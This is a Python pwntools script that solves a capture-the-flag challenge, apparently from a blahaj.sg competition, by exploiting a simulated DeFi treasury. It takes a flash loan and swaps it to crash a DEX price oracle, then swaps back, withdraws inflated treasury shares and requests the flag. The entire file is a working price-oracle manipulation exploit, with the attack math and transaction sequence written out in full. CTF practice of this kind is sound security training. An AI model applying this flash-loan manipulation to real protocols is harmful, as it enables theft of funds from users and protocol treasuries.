import json
from pwn import *

HOST = 'misc-oracle.chals.blahaj.sg'
PORT = 26494

DECIMALS = 10**18
USER = "0x38Dc745781c2C5a16a5d1870876ABFbD1Cec5ac2"
DEX = "0x3a8e9A27AbC7cb3F71691c1B5bf216e72A5D0283"
TREASURY = "0x098Ea798EaE10179E5505870095d5a49Db155Fb0"

def send_tx(r, tx):
    r.sendlineafter(b'> ', json.dumps(tx).encode())
    try:
        return json.loads(r.recvline())
    except:
        return {}

def solve():
    liq_u = 10000 * DECIMALS
    liq_b = 10000 * DECIMALS
    k = liq_u * liq_b
    
    loan = 1000000 * DECIMALS
    
    new_b_1 = liq_b + loan
    new_u_1 = k // new_b_1
    liq_u_crashed = new_u_1 
    
    deposit_amt = 500 * DECIMALS
    treasury_final_bal = (1000000 + 500) * DECIMALS
    
    target_u = 10500 * DECIMALS 
    swap_in_usdc = target_u - liq_u_crashed
    
    new_u_2 = target_u
    new_b_2 = k // new_u_2
    
    final_rate = (new_u_2 * DECIMALS) // new_b_2
    
    shares = (treasury_final_bal * DECIMALS) // final_rate
    while True:
        calc = (shares * final_rate) // DECIMALS
        if calc == treasury_final_bal:
            break
        elif calc < treasury_final_bal:
            shares += 1
        else:
            shares -= 1
            
    print(f"[*] Calculated Shares to Burn: {shares}")
    
    r = remote(HOST, PORT)
    
    tx1 = {
        "user": USER,
        "calls": [
            {
                "address": TREASURY, 
                "function": "execute_atomic_batch",
                "args": [
                    loan, 
                    [
                        {"address": DEX, "function": "swap", "args": ["BLAHAJ", "USDC", loan]},
                        {"address": TREASURY, "function": "deposit_usdc", "args": [deposit_amt]},
                        {"address": DEX, "function": "swap", "args": ["USDC", "BLAHAJ", swap_in_usdc]}
                    ]
                ]
            }
        ]
    }
    print("[*] Sending Atomic Batch Attack...")
    send_tx(r, tx1)

    tx2 = {
        "user": USER,
        "calls": [
            {
                "address": TREASURY,
                "function": "withdraw_usdc",
                "args": [shares]
            }
        ]
    }
    print("[*] Sending Withdraw Transaction...")
    send_tx(r, tx2)
    
    tx3 = {"user": USER, "calls": [{"function": "getFlag", "args": []}]}
    print("[*] Retrieving Flag...")
    res3 = send_tx(r, tx3)
    
    try:
        flag = res3["results"][0]["flag"]
        print(f"\n[+] FLAG: {flag}\n")
    except:
        print("[-] Failed to get flag. Full response:", res3)
        
    r.close()

if __name__ == "__main__":
    solve()